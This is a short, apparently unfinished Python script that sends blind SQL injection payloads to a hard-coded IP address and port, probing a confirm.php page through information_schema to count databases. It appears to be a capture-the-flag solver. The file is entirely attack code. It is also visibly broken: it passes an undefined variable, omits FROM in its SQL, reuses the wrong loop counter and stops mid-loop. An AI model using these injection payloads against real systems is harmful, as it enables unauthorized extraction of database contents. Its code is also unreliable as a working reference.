import requests

url = "http://52.231.24.87:50526/confirm.php"
p = {'name' : 'g0pher'}

## get database
cnt = 0
for i in range(30):
	p['name'] = "g0pher98' union select if("+str(i)+" < (select count(*) information_schema.schemata)a, (select 1), (select 1,0))#"
	res = requests.get(url, params=params)
	if "대기중" not in res.text:
		cnt = i
		break

for db in range(cnt):
	p['name'] = "g0pher98' union select if("+str(i)+" < (select count(*) information_schema.schemata)a, (select 1), (select 1,0))#"
	res = requests.get(url, params=params)
	if "대기중" in res.text:
		pass
	

